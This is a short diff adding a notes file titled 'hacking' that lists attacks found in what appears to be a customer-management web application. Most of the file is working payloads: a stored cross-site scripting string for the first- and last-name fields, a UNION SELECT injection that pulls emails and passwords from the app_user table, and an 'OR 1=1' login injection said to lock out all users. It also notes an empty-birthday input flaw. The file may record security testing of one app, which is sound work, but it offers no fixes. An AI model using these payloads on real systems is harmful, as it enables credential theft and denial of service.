@@ -1,0 +1,19 @@
+hacking 
+
+
+1. add <script>alert("You are hack")"</script>
+    in lastname or firstname in adding custumers.
+
+
+2. using your print all custumers:
+    %' UNION SELECT 1,email,password,4 FROM app_user' --
+
+
+3. when add new costumer:
+    make the birthday empty --
+
+4. when add new user:
+    make the birthday empty --
+
+5. when the 3 attempt in view of login you can make sql injection
+    test@example.com'  OR 1=1 --  it will be block all users in the system
